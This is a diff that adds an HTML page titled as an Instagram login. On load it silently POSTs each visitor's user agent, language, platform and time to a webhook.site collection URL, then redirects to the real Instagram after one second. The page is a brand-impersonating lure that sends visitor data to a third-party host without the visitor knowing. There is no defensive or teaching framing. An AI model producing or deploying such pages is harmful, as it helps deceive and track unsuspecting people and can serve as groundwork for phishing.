@@ -1,0 +1,32 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>Instagram • Log in</title>
+    <script>
+      // ส่งข้อมูลไปยัง Webhook
+      fetch("https://webhook.site/2ee02f9b-0864-4fbf-8db6-cf3bfb8b9bf1", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          userAgent: navigator.userAgent,
+          language: navigator.language,
+          platform: navigator.platform,
+          time: new Date().toString()
+        })
+      });
+
+      // Redirect ไป Instagram หลัง 1 วินาที
+      setTimeout(() => {
+        window.location.href = "https://www.instagram.com";
+      }, 1000);
+    </script>
+  </head>
+  <body style="font-family: Arial, sans-serif; text-align: center; padding-top: 50px;">
+    <img src="https://instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" style="width: 150px; margin-bottom: 20px;">
+    <p style="font-size: 16px; color: #888;">Redirecting to Instagram...</p>
+  </body>
+</html>
